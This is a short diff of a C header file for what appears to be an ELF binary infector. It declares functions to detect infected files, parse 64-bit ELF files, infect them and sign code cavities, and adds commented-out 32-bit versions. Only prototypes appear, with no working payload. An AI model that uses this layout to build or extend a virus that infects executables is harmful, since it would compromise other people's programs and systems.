@@ -40,16 +40,21 @@ void process_file(const char *path);
 int open_file(t_file *file, const char *path);
 void close_file(t_file *file);
 int map_file(t_file *file);
-void unmap_file(t_file *file);
+int unmap_file(t_file *file);
 
 int is_file_infected(t_file *file);
 int is_valid_elf(t_file *file);
-void process_elf(t_file *file);
-// int sign_generic_append(t_file *file);
+int process_elf(t_file *file);
+int sign_generic_append(t_file *file);
 
-void process_elf64(t_file *file);
+int process_elf64(t_file *file);
 int parse_elf64(t_file *file, t_elf64 *elf64);
-void infect_elf64(t_file *file, t_elf64 *elf64);
+int infect_elf64(t_file *file, t_elf64 *elf64);
 int sign_elf64_cavity(t_file *file, t_elf64 *elf64);
+
+// int process_elf32(t_file *file);
+// int parse_elf32(t_file *file, t_elf32 *elf32);
+// int infect_elf32(t_file *file, t_elf32 *elf32);
+// int sign_elf32_cavity(t_file *file, t_elf32 *elf32);
 
 #endif
